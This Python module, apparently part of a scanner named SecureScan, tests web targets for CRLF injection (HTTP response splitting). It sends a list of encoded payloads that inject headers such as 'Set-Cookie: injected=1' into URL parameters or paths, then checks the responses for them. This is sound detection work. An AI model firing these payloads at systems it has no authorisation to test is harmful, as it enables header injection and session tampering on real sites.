"""
CRLF Injection (HTTP Response Splitting) Detection
OWASP A03:2021 - Injection
"""

import requests
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote


CRLF_PAYLOADS = [
    '%0d%0aX-Injected: hacked',
    '%0d%0aSet-Cookie: injected=1',
    '%0a%0dX-Injected: hacked',
    '%E5%98%8D%E5%98%8A' + 'X-Injected: hacked',   # Unicode bypass
    '\r\nX-Injected: hacked',
    '%0d%0a%20X-Injected: hacked',
]


class CRLFModule:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'SecureScan/1.0'})

    def test_url(self, url: str) -> List[Dict[str, Any]]:
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        test_targets = list(params.keys()) if params else ['q', 'search', 'url', 'redirect']

        for param in test_targets:
            for payload in CRLF_PAYLOADS:
                if params:
                    test_params = {**{k: v[0] for k, v in params.items()}, param: payload}
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, safe='%')))
                else:
                    test_url = f"{url.rstrip('/')}/{payload}"

                try:
                    resp = self.session.get(test_url, timeout=8, allow_redirects=False)
                    # Check if our injected header appeared in the response headers
                    if 'X-Injected' in resp.headers or 'injected' in resp.headers.get('Set-Cookie', ''):
                        findings.append({
                            "name": "CRLF Injection (HTTP Response Splitting)",
                            "severity": "medium",
                            "owasp_category": "A03:2021",
                            "url": test_url,
                            "parameter": param,
                            "confidence": 95,
                            "technique": "CRLF Header Injection",
                            "evidence": {
                                "payload": payload,
                                "injected_header_found": True,
                                "response_headers": dict(resp.headers)
                            },
                            "poc": f"curl -v '{test_url}'",
                            "remediation": "Strip or reject CR (\\r) and LF (\\n) characters from all user-controlled values that flow into HTTP headers."
                        })
                        break
                except Exception:
                    continue

        return findings

    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        all_findings = []
        for url in urls:
            all_findings.extend(self.test_url(url))
        return all_findings
